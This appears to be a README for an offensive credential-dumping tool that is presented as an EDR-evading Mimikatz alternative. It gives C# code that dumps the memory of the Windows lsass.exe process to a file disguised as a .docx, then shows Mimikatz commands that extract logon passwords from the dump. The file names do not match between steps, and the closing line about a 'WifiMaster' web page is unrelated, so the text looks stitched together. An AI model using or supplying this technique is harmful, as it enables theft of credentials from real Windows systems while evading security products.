# Lsass-Dump-PS
The LsassDumper is a Mimikatz alternative tool used for credential dumping created to bypass EDR products.



# How to Use

* step 1: Edit the script: Chanage the path to the file (file parameter)
```C#
 public static void RunMe(int procId)
        {
            string dumpFileName = "C:\\Users\\Username\\Desktop\\foo.docx";
            FileStream file = new FileStream(dumpFileName, FileMode.Create);
            IntPtr hProcess = OpenProcess((uint)0x001F0FFF, true, procId);
            bool res;
            MINIDUMP_EXCEPTION_INFORMATION info = new MINIDUMP_EXCEPTION_INFORMATION();
            res = MiniDumpWriteDump(hProcess, (uint)procId, file.SafeFileHandle.DangerousGetHandle(), 0002, ref info, IntPtr.Zero, IntPtr.Zero);
            if(res){
                Console.WriteLine("Created By Liav Gutman AKA PT-MasterMind :)");
            
            }else{
                Console.WriteLine("Something went wrong please try again");
            
            
            }
 
```
* step 2: Configre the `lsass.exe` process id.
```
 [GoodMod.Dump]::RunMe(16048)
```
* step 3: Load the dump file (foo.docx) to [Mimikatz](https://github.com/gentilkiwi/mimikatz) and done!
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::minidump liav.docx

mimikatz # sekurlsa::logonpasswords
 
```


If you want to choose another web page go to: /opt/WifiMaster/program_files/server and then put there the page you want to and name it " index.html "
